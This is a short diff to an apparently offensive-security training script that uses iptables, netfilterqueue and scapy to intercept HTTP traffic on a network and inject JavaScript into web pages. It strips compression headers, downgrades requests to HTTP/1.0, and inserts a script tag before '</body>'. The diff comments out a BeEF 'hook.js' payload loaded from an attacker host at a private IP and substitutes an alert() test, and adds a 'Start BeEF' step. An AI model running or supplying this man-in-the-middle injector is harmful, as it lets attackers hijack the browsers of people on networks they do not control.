@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 # Steps
-# 1. $
+# 1. $ Start BeEF
 # 2. $ sudo iptables -F
 # 3. $ sudo iptables -I INPUT -j NFQUEUE --queue-num 0
 # 4. $ sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
@@ -29,14 +29,16 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
         try:
             load = scapy_packet[scapy.Raw].load.decode()
-            injection_code = '<script src="http://172.16.235.129:3000/hook.js"></script>'
+            # injection_code = '<script src="http://172.16.235.129:3000/hook.js"></script>'
+            injection_code = '<script>alert("it works!")</script>'
 
-            if scapy_packet[scapy.TCP].dport == 80:
+            if scapy_packet[scapy.TCP].dport == 8080:
                 print('[+] Request')
                 load = re.sub(
-                    'Accept-Encoding:.*?\\r\\n', '', load)
+                    r'Accept-Encoding:.*?\\r\\n', '', load)
+                load = load.replace('HTTP/1.1', 'HTTP/1.0')
 
-            elif scapy_packet[scapy.TCP].sport == 80:
+            elif scapy_packet[scapy.TCP].sport == 8080:
                 print('[+] Response')
 
                 load = load.replace('</body>', injection_code + '</body>')
